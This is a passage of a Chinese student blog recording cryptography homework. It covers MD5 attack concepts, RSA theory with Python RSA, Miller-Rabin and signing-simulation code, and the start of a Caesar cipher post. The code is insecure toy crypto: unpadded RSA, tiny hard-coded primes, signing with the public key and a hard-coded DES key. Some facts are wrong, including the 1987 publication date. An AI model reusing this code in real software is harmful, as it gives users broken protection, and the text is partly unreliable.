<li><p>哈希长度扩展攻击，具体细节可以参考大牛道哥的博文 <a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a>，简单说来就是在已知输入M的长度（注意是长度）和其MD5值的情况下，可以在原文M后面附加任意内容，同时能够推算出新的MD5。在某些将MD5作为签名手段的系统中，攻击者可以在原文M后面随意添加内容同时能够提供正确的MD5值。 在校学习平台上就有类似的题目</p>
<p>存在这一问题的原因是算法使用了Merkle–Damgård construction进行数据的压缩，不止MD5，很多流行的算法都存在这个问题，比如SHA1。 </p>
</li>
<li><p>特定前缀攻击。两个不同的exe程序会在屏幕上打出不同的字符，但是他们的MD5值确是相同的，exe程序下载地址如下 <a href="https://www.cnblogs.com/A2008A/archive/2012/08/10/2631840.html" target="_blank" rel="noopener">link</a>，专家还给出了MD5碰撞快读生成器。</p>
</li>
</ul>
<p>面对这两个攻击，一个提高MD5安全性的有效手段是 <strong>加盐（每一个口令同一个叫做”盐“（salt）的n位随机数相关联 ）</strong>。</p>
<p><strong>实用性分析：</strong></p>
<p>​    即使MD5现在已经被证明不是百分百安全的，但是被攻破只是有限情况下的个例，对于大多数安全性要求不是很高的应用中，MD5依然拥有广泛的使用空间。MD5具有压缩性，容易计算，抗修改性和强抗碰撞性等特点，在实际应用中，其结果方便存储，在对文件加密上有很大的优势（只需要32位字符串就能对一个巨大的文件进行验证完整性 ），且加密损耗低，对性能要求较低，计算迅速。由于其不可逆的特性，在实际应用中可以用来用户密码，请求参数校验，文件校验等用途。</p>
<h1 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h1><h2 id="RSA公钥加密体制"><a href="#RSA公钥加密体制" class="headerlink" title="RSA公钥加密体制"></a>RSA公钥加密体制</h2><p>​    RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种<em>非对称加密算法</em>。RSA是目前最重要的网络加密算法。</p>
<p>算法原理：</p>
<blockquote>
<p>RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难</p>
</blockquote>
<p>​    第一步</p>
<blockquote>
<p>选定两个质数p、q，实际应用中这两个数越大安全性越高。</p>
</blockquote>
<p>​    第二步</p>
<blockquote>
<p>计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是<em>密钥长度</em>，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。</p>
</blockquote>
<p>​    第三步</p>
<blockquote>
<p>计算n的 <em>欧拉函数</em> φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表</p>
</blockquote>
<p>​    第四步</p>
<blockquote>
<p> 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击<a href="https://baike.baidu.com/item/%E4%BA%92%E8%B4%A8" target="_blank" rel="noopener">这里</a></p>
</blockquote>
<p>​    第五步</p>
<blockquote>
<p>寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用<em>扩展欧几里得算法</em> 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。</p>
</blockquote>
<p>​    第六步</p>
<blockquote>
<p>封装<em>（n，e1）</em>为<em>公钥</em> ，<em>（n，e2）</em>为<em>私钥</em>。</p>
</blockquote>
<p>​    至此，所有准备工作完成。</p>
<p>​    加密和解密</p>
<blockquote>
<p> 先介绍一下加解密的公式，假定明文为A，那么，<br> 密文B≡A^e1 mod n，要传输给对方的就是B<br> 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。</p>
</blockquote>
<p>​    假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(<em>^▽^</em>)。</p>
<blockquote>
<p> 假定要传输的明文为： 32<br>  注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode      编码传输。</p>
</blockquote>
<p>​    加密</p>
<blockquote>
<p>A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密</p>
</blockquote>
<p>​    解密</p>
<blockquote>
<p>A = B^e2 mod n = 32 ，成功得到明文32！</p>
</blockquote>
<p>简单证明一下上述算法的正确性：</p>
<p> <em>欧拉定理</em> </p>
<blockquote>
<p>若n,a为正整数，且n,a互质，则<br>$a^{φ(n)} ≡ 1 （mod \; n）$ </p>
</blockquote>
<p>​    φ（n）为 <em>欧拉函数</em> ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质</p>
<blockquote>
<p>如果n可以分解为两个互质的整数p、q的乘积，那么有<br>φ（n）= (p-1) * (q-1)</p>
</blockquote>
<p>​    接下来要证明的就是为什么下面两个式子可以互换实现</p>
<blockquote>
<p>B=A^e1   mod n<br>A=B^e2   mod n</p>
</blockquote>
<p>​    解密规则为</p>
<blockquote>
<p>A=B^e2 mod n</p>
</blockquote>
<p>​    根据加密规则</p>
<blockquote>
<p>B = A^e1 mod n<br>B = A^e1 - kn</p>
</blockquote>
<p>​    代入解密式中</p>
<blockquote>
<p>(A^e1 - kn)^e2 ≡ A （mod n）</p>
</blockquote>
<p>​    等于证</p>
<blockquote>
<p>$A^{e1*e2} ≡ m （mod \; n）$</p>
</blockquote>
<p>​<br>由 <em>欧拉定理</em> 可以得到</p>
<blockquote>
<p>e1&#42;e2 ≡ 1  [ mod φ（n）]<br>e1&#42;e2 ≡ hφ（n）+1</p>
</blockquote>
<p>​    代入前面的式子可以得到</p>
<blockquote>
<p>$A^{hφ（n）+1} \; ≡ m (mod\;n)$</p>
</blockquote>
<p>​    上式恒成立，则算法正确性得证。</p>
<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串转为2进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(s)</span>:</span></span><br><span class="line">	text = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">		text += <span class="string">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class="number">2</span>:])</span><br><span class="line">	<span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2str</span><span class="params">(s)</span>:</span></span><br><span class="line">	text = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">8</span>):</span><br><span class="line">		<span class="keyword">if</span> int(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		text += chr(int(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">	<span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastExpMod</span><span class="params">(b, e, m)</span>:</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (e&amp;<span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># ei = 1, then mul</span></span><br><span class="line">            result = (result * b) % m</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">        b = (b*b) % m</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数,输入为plain字符明文，n，e</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_encrypt</span><span class="params">(plain)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> n</span><br><span class="line">	<span class="keyword">global</span> e</span><br><span class="line">	<span class="comment"># 将明文转为比特串</span></span><br><span class="line">	bitplian = str2bin(plain)</span><br><span class="line">	group_len = int(math.log(n,<span class="number">2</span>)) - <span class="number">1</span> </span><br><span class="line">	arr_group = []</span><br><span class="line">	<span class="keyword">if</span> (len(bitplian) % group_len) != <span class="number">0</span>:</span><br><span class="line">		bitplian += <span class="string">"0"</span>*(group_len-(len(bitplian) % group_len))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(bitplian) // group_len):</span><br><span class="line">		arr_group.append(bitplian[i*group_len:i*group_len+group_len])</span><br><span class="line">	cipher = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> arr_group:</span><br><span class="line">		ci = fastExpMod(int(item,<span class="number">2</span>),e,n)</span><br><span class="line">		cipher += <span class="string">f'<span class="subst">&#123;bin(ci)[<span class="number">2</span>:]:<span class="number">0</span>&gt;&#123;group_len+<span class="number">2</span>&#125;</span>&#125;'</span></span><br><span class="line">	<span class="keyword">return</span> hex(int(cipher,<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数，输入为cipehr16进制密文，n，d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> n</span><br><span class="line">	<span class="keyword">global</span> d</span><br><span class="line">	bitcipher = bin(int(cipher,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">	temp_len = int(math.log(n,<span class="number">2</span>)) + <span class="number">1</span> </span><br><span class="line">	<span class="keyword">if</span> (len(bitcipher) % temp_len) != <span class="number">0</span>:</span><br><span class="line">		bitcipher = <span class="string">"0"</span>*(temp_len - (len(bitcipher) % temp_len)) + bitcipher</span><br><span class="line">	group_len = int(math.log(n,<span class="number">2</span>)) + <span class="number">1</span></span><br><span class="line">	arr_group = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(bitcipher) // group_len):</span><br><span class="line">		arr_group.append(bitcipher[i*group_len:i*group_len+group_len])</span><br><span class="line">	bitplain = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> arr_group:</span><br><span class="line">		<span class="comment"># mi = (int(item,2)**d % n)</span></span><br><span class="line">		mi = fastExpMod(int(item,<span class="number">2</span>),d,n)</span><br><span class="line">		bitplain += <span class="string">f'<span class="subst">&#123;bin(mi)[<span class="number">2</span>:]:<span class="number">0</span>&gt;&#123;group_len<span class="number">-2</span>&#125;</span>&#125;'</span></span><br><span class="line">	<span class="keyword">return</span> bin2str(bitplain)</span><br><span class="line"></span><br><span class="line">p = <span class="number">2147483647</span></span><br><span class="line">q = <span class="number">1000000007</span></span><br><span class="line">n = p * q</span><br><span class="line">pi_n = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = int(gp.invert(e,pi_n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	mode = sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">if</span> mode == <span class="string">'e'</span>:</span><br><span class="line">		plain = input(<span class="string">"Plz input message: "</span>)</span><br><span class="line">		cipher = rsa_encrypt(plain)</span><br><span class="line">		print(<span class="string">"cipher: "</span>, cipher)</span><br><span class="line">	<span class="keyword">elif</span> mode == <span class="string">'d'</span>:</span><br><span class="line">		cipher = input(<span class="string">"Plz input cipher: "</span>)</span><br><span class="line">		plain = rsa_decrypt(cipher)</span><br><span class="line">		print(<span class="string">"plain: "</span>,plain)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><strong>实例演示：</strong></p>
<p><img src="crypto2/2.png" alt="demo"></p>
<p><strong>安全性分析</strong></p>
<p>​    到目前为止，世界上还没有任何可靠的攻击RSA算法的方式 。然而即便RSA算法目前来说是安全可靠的，<strong>但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题</strong>，从而也派生出针对各种特定场景下的RSA攻击方法。 此处指简单列举一些攻击方法</p>
<ul>
<li><p>直接分解n。一般这种情况是由于n较小，或者使用已经使用过的p、q造成的，这样会造成RSA直接被破解</p>
</li>
<li><p>低加密指数攻击。当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 </p>
<p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p>
<p>即：</p>
</li>
</ul>
<blockquote>
<script type="math/tex; mode=display">cequiv m^e mod n</script></blockquote>
<p>  如果e=3，且$ m^e&lt;{n} $，那么：</p>
<blockquote>
<p>​                        $ c= m^e,$ $e=3$</p>
<p> ​                        $ m=sqrt[3]{c}$</p>
</blockquote>
<p>  如果明文的三次方比n大，但是不是足够大，那么设k，有：</p>
<p>  ​                        $ c= m^e+kn$</p>
<p>  爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。</p>
<ul>
<li><p>低加密指数广播攻击。如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 </p>
<p>即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：</p>
<p>​                        $ c_1equiv m^e$ $mod$ $n_1$</p>
<p>​                        $ c_2equiv m^e$ $mod$ $n_2$</p>
<p>​                        $ c_3equiv m^e$ $mod$ $n_3$</p>
<p>对上述等式运用中国剩余定理，在e=3时，可以得到：</p>
<p>​                        $ c_xequiv m^3$ $mod$ $n_1n_2n_3$</p>
<p>通过对$ c_x $进行三次开方可以求得明文。</p>
</li>
<li><p>公模攻击。如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。</p>
<p>即：</p>
<p>​                        $ c_1equiv m^{e_1}$ $mod$ $n$</p>
<p>​                        $ c_2equiv m^{e_2}$ $mod$ $n$</p>
<p>此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。</p>
</li>
</ul>
<hr>
<p>​    由于RSA良好的安全性，RSA可用来电子签名中来确认通信双方身份。</p>
<hr>
<p>通过对RSA的分析可知，RSA的安全性是基于大数的难分解性的，所以应尽可能选择足够大的p、q，目前大素数的产生依然是一个世界难题，这里展示一个素性判断算法miller-rabin算法，可以利用此算法判断一个数是不是素数从而穷举产生大素数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xn_mod_p2</span><span class="params">(x, n, p)</span>:</span></span><br><span class="line">  res = <span class="number">1</span></span><br><span class="line">  <span class="comment"># n_bin = bin(n)[2:]</span></span><br><span class="line">  n_bin = bin(int(n))[<span class="number">2</span>:]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(n_bin)):</span><br><span class="line">    res = res**<span class="number">2</span> % p</span><br><span class="line">    <span class="keyword">if</span> n_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">      res = res * x % p</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin_witness</span><span class="params">(a, p)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> p == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">  <span class="keyword">if</span> p == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">  <span class="comment">#p-1 = u*2^t 求解 u, t</span></span><br><span class="line">  n = p - <span class="number">1</span></span><br><span class="line">  t = int(math.floor(math.log(n, <span class="number">2</span>)))</span><br><span class="line">  u = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> t &gt; <span class="number">0</span>:</span><br><span class="line">    u = n / <span class="number">2</span>**t</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span>**t == <span class="number">0</span> <span class="keyword">and</span> u % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    t = t - <span class="number">1</span></span><br><span class="line">  b1 = b2 = xn_mod_p2(a, u, p)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, t + <span class="number">1</span>):</span><br><span class="line">    b2 = b1**<span class="number">2</span> % p</span><br><span class="line">    <span class="keyword">if</span> b2 == <span class="number">1</span> <span class="keyword">and</span> b1 != <span class="number">1</span> <span class="keyword">and</span> b1 != (p - <span class="number">1</span>):</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    b1 = b2</span><br><span class="line">  <span class="keyword">if</span> b1 != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_test_miller_rabin</span><span class="params">(p, k)</span>:</span></span><br><span class="line">  <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">    a = randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> miller_rabin_witness(a, p):</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    k = k - <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">num = input(<span class="string">u"请输入要进行Miller-Rabin算法检测的数："</span>)</span><br><span class="line"><span class="keyword">if</span> prime_test_miller_rabin(int(num),<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">u"&#123;0&#125;大概率是素数"</span>.format(num))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">u"&#123;0&#125;是合数 "</span>.format(num))</span><br></pre></td></tr></table></figure>
<p><strong>实例演示：</strong></p>
<p><img src="crypto2/3.png" alt="demo"></p>
<h1 id="通信过程模拟"><a href="#通信过程模拟" class="headerlink" title="通信过程模拟"></a>通信过程模拟</h1><p>​    有了前面的算法基础，我们现在可以模拟出一个从Alice到Bob的通信过程，步骤如下:</p>
<p><img src="crypto2/4.png" alt="demo"></p>
<p>​    接下来用代码详细模拟了一下该过程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> des</span><br><span class="line"></span><br><span class="line">print(<span class="string">"现在开始模拟Alice到Bob之间的通信过程："</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'*******Alice的发送准备*********'</span>)</span><br><span class="line">print()</span><br><span class="line">message = <span class="string">"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定message哈希值</span></span><br><span class="line">message_hash = md5.encrypt(message)</span><br><span class="line">sign = rsa.rsa_encrypt(message_hash)</span><br><span class="line">key = <span class="string">"infosecu"</span></span><br><span class="line">print(<span class="string">"Alice想要发送到明文信息: "</span>,message)</span><br><span class="line">print(<span class="string">"Alice的DES秘钥："</span>, key)</span><br><span class="line">print(<span class="string">"消息哈希(用于检验消息完整性): "</span>,message_hash)</span><br><span class="line">print(<span class="string">"Alice签名: "</span>, sign)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'公开信道上传输DES加密数据'</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'*******sending...**********'</span>)</span><br><span class="line">print()</span><br><span class="line">send_mess = des.encrypt(message,key)</span><br><span class="line">send_sign = des.encrypt(sign,key)</span><br><span class="line">print(<span class="string">"message: "</span>,send_mess)</span><br><span class="line">print(<span class="string">"sign: "</span>,send_sign)</span><br><span class="line">print(<span class="string">"message_hash: "</span>,message_hash)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'********sending finish*******'</span>)</span><br><span class="line">print()</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"********Bob处理收到的信息********"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"DES解密对应的内容："</span>)</span><br><span class="line">b_sign = des.decrypt(send_sign,key)</span><br><span class="line">b_mess = des.decrypt(send_mess,key)</span><br><span class="line">print(<span class="string">"Alice发送的明文message： "</span>,b_mess)</span><br><span class="line">print(<span class="string">"消息签名sign： "</span>,b_sign)</span><br><span class="line">print()</span><br><span class="line">b_mess_hash = md5.encrypt(message)</span><br><span class="line">print(<span class="string">"此时Bob自己求出明文哈希值： "</span>, b_mess_hash)</span><br><span class="line">print(<span class="string">"之后与Alice发送的消息哈希进行校验"</span>)</span><br><span class="line">print(<span class="string">"...****...."</span>)</span><br><span class="line"></span><br><span class="line">print(b_mess_hash,<span class="string">"=="</span>,message_hash,<span class="string">"消息在传输过程中没有出错! 但是无法确定是否是Alice所发。"</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line">vert = rsa.rsa_decrypt(sign)</span><br><span class="line">print(<span class="string">"Bob对签名进行RSA解密： "</span>,vert)</span><br><span class="line">print(<span class="string">"对解密后的签名值与自己计算出的MD5值相比较来验证发送方身份.."</span>)</span><br><span class="line">print(<span class="string">"verting....."</span>)</span><br><span class="line"><span class="keyword">if</span> vert == b_mess_hash:</span><br><span class="line">	print(<span class="string">"message is ok. 此时Bob可以确认从Alice处收到了完整的信息。"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	print(<span class="string">"message is broken."</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"通信过程完成，Bob收到了Alice的信息！"</span>)</span><br></pre></td></tr></table></figure>
<p><strong>实例演示：</strong></p>
<p><img src="crypto2/5.png" alt="demo"></p>
]]></content>
      
        <categories>
            
            <category> Record </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[密码学作业记录（一）]]></title>
      <url>/2019/01/15/crypto1/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习密码学，研究了一些密码学算法，特此记录一下。</p>
<a id="more"></a>
<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><p>古典密码体制是基于古代落后的计算条件和落后的密码学与数学知识建立的，本部分选取了<strong>凯撒密码</strong>和<strong>仿射密码</strong>。</p>
<h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>凯撒密码本质上是一种置换密码，且为一对一的置换加密方式。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</p>
<p><em>代码如下</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 名密文输入范围是26个英文小写字母</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">"encrypt"</span>:</span><br><span class="line">	plain = raw_input(<span class="string">"Please input plaintext: "</span>)</span><br><span class="line">	key = input(<span class="string">"Please input key: "</span>)</span><br><span class="line">	cip = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">		temp = (ord(plain[i]) - ord(<span class="string">'a'</span>) + key) % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">		cip += chr(temp)</span><br><span class="line">	print(<span class="string">"cipher: "</span> + cip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> mode == <span 